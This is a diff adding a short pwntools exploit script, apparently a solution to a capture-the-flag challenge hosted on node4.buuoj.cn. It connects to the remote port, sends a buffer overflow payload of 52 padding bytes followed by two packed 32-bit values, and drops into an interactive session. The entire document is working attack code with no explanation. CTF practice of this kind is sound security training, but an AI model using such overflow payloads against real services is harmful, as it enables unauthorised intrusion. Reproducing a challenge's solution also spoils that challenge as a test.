@@ -1,0 +1,5 @@
+from pwn import *
+p=remote("node4.buuoj.cn",26115)
+payload=b'aaaa'*13+p32(0x11)+p32(0)
+p.sendline(payload)
+p.interactive()
